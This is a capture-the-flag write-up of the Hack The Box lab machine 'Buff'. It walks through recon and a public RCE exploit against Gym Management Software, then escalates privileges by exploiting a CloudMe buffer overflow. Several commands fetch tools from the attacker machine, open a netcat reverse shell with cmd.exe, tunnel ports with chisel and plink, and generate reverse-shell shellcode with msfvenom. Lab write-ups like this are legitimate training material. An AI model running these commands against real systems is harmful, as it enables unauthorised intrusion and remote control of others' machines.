# Buff
###### tags: `OSCP`
https://www.hackthebox.eu/home/machines/profile/263

First connect to Hack The Box vpn: 
```
openvpn {username}.ovpn
```

Then check your machine IP compare with the log message output from VPN.
![](https://i.imgur.com/fPKAhmL.png)
Seems that my machine is `10.10.14.42`

```
nmap -sS -sV -A -p- -oN NmapBuff.txt 10.10.10.198
```
![](https://i.imgur.com/ECvsnOi.png)

![](https://i.imgur.com/Ousshew.png)

```
dirb http://10.10.10.198:8080
```
![](https://i.imgur.com/auTeah0.png)
With these data, I found the system information on `http://10.10.10.198:8080/contact.php`

![](https://i.imgur.com/baTfEeJ.png)
Here we got some information, `gym management software 1.0`

![](https://i.imgur.com/JmMv7yr.png)
We first use `searchsploit gym` then we found `WordPress Plugin WPGYM - SQL Injecti`.
Aparently, it's not a wordpress framework.

![](https://i.imgur.com/7oBbYHA.png)
Then we search it with exploit-db, and we found gym rce in https://www.exploit-db.com/exploits/48506

![](https://i.imgur.com/V62mZYL.png)
After we save the PoC and try to use the command `gymrce.py http://10.10.10.198:8080/` to run the script.

First, we check the system, use `systeminfo`.
![](https://i.imgur.com/OwXoTfP.png)
Let's try `windows-exploit-suggester`: https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```
curl https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py --output windows-exploit-suggester.py
chmod +x ./windows-exploit-suggester.py
./windows-exploit-suggester.py --update
pip install xlrd --upgrade
```
We get python2 unsupport problem with pip target to python3, copy `xlrd` & `xlrd-1.2.0.dist-info` from `/usr/local/lib/python3.8/dist-packages` to `/usr/local/lib/pythton2.7/dist-packages`

Then copy the result of `systeminfo` in target machine:
```
./windows-exploit-suggester.py --database 2020-11-20-mssb.xls --systeminfo buff-systeminfo.txt 
```
Save list, and it might be used later.


`whoami` to check the user name.
![](https://i.imgur.com/gOoUxlo.png)

`dir` to check the directory.
![](https://i.imgur.com/NzAbeq7.png)

![](https://i.imgur.com/ESrqsRv.png)
Check user on this machine: 
```
dir c:\users\
```

![](https://i.imgur.com/1QQajBT.png)
As we know the user who run xampp with gym management software is called: `shaun`.
Let's check the flag under the `shaun` user folder.

![](https://i.imgur.com/V2mJLyu.png)
Then we can `type` the flag out.

![](https://i.imgur.com/urCwmAX.png)
Here we got the flag.

BUT, it's not the end, we still need to get the root.
So let's try to download checking batch script from: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASbat/winPEAS.bat

And use `python -m SimpleHTTPServer 8787` or `python3 -m http.server 8787` to allow target machine download the script. 
Then use `curl http://10.10.14.42:8787/winPEAS.bat --output winPEAS.bat` to download the script

Then same, upload `nc.exe` to target machine, the binary should be under `/usr/share/windows-binaries/nc.exe`, copy it to your Python Server folder

```
curl http://10.10.14.42:8787/nc.exe --output nc.exe
```
Download the latest version of plink & chisel, we will use it later.
```
curl http://10.10.14.42:8787/plink.exe --output plink.exe
```
```
curl http://10.10.14.42:8787/chisel.exe --output chisel.exe
```


Before use nc to connect back to your attack machine, start a listener on it.
```
nc -nvlp 8000
```

Then use nc to connect back to attack machine: 
```
nc.exe 10.10.14.42 8000 -e cmd.exe
```
![](https://i.imgur.com/lHZkGqG.png)

Then we launch the `winPEAS.bat`, before use it, read the README of it on github.

After a while search on it, Windows Defender is enable, and cve in windows-exploit-suggester seems not working and be detect by Anti-Virus.
![](https://i.imgur.com/kh7NXqy.png)

I check several folder under `shaun` and find a batch file under `c:\Users\shaun\Documents` called `Tasks.bat`, but seems just a cron job script for last level.
![](https://i.imgur.com/4m5aerQ.png)

Then I found `CloudMe_1112.exe` under `c:\Users\shaun\Downloads`.
![](https://i.imgur.com/gOb0DaW.png)

Let's check is this program running or not with `tasklist /v`
![](https://i.imgur.com/QyOjU02.png)
As you see `N/A`, that might be other User and System Service who run the process.

As we know, there's no other user in this machine (with `dir c:\Users\`, in early-reconing stage)
![](https://i.imgur.com/JXORjgo.png)
The launcher privilege of `CloudMe.exe` might be System.

`wmic process where "name='CloudMe.exe'" get ProcessID, ExecutablePath`
Although, we cannot check if the process really link to the image under `c:\Users\shaun\Downloads`, we can still take it as hint to try with `searchsploit`.
![](https://i.imgur.com/Oi43iHo.png)

![](https://i.imgur.com/M7qTMng.png)
With `searchsploit CloudMe` we get several results.
Let's use `exploits/windows/remote/48389.py`.
![](https://i.imgur.com/aE6o9jW.png)
As we see, it's a python script but python is not installed on target machine.
We need to establish a tunnel to port forwarding the service with chisel.(plink might work, but I always encounting time out here.)

```
# on attack machine
./chisel server --port 9487 --reverse
```
![](https://i.imgur.com/0uPPifC.png)

From PoC, we know that the `CloudMe` work on `8888` by default.
Let's check it with `netstat -an | findstr "LISTENING"`


So let's binding the port `8888`.
```
# on victim machine
.\chisel.exe client 10.10.14.42:9487 R:8888:127.0.0.1:8888
```
![](https://i.imgur.com/BlU6Zl0.png)
(I got ip re-dispatch during by HTB this step, it change to `10.10.14.4`, I will still use `10.10.14.42` for the rest in this write-up)

Then we need to replace the shellcode inside the PoC to let victim return shell back to `10.10.14.42:9527` with the `nc` binary we put in.
```
msfvenom -p windows/exec CMD='C:\xampp\htdocs\gym\upload\nc.exe -e cmd.exe 10.10.14.42 9527' -b '\x00\x0a\x0d\x1a\x09' -f py -v payload
```
![](https://i.imgur.com/BGQFcmE.png)
`-b` is bad charaters list, `'\x00', '\x0a', '\x0d', '\x1a', '\x09'` are represented `'\0', '\n', '\r', '\Z' , '\t'` characters.
Use this payload to replace original one in PoC.
Using some text editor will make this step more easier.
![](https://i.imgur.com/nzAOtQw.png)

Before launch the PoC, open a new listener which your payload point to.
```
nc -nvlp 9527
```
![](https://i.imgur.com/eLZv3Ah.png)
Now, we in. Flag is on the `desktop`.

## Method 2
Let's use `plink` we copied with `nc` before to establish the port forwarding.
And also, the exploit shows the default port as 8888.

As we trying to use plink to do the port forwarding, setting the sshd service with folowing:
```
apt purge openssh-server
apt install openssh-server
service ssh start
ss -antlp | grep sshd
```
https://medium.com/@informationsecurity/remote-ssh-tunneling-with-plink-exe-7831072b3d7d

Then we can use `plink` from putty on target now.
```
#old kali version
plink.exe -l root -pw toor 10.10.14.42 -R 8888:127.0.0.1:8888
# new kali version
plink.exe -l kali -pw kali 10.10.14.42 -R 8888:127.0.0.1:8888
```
or
```
# insert info by yourself
plink.exe -ssh root@10.10.14.42 -R 8888:127.0.0.1:8888
```
Remeber to download the latest [`plink`](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) cuz to the old version use old algorithm which not allow `putty` it packed to [`allow the key exchange`](https://www.schrodinger.com/kb/520463).
(becareful, it's putty's plink, not the data analyzing tool plink.)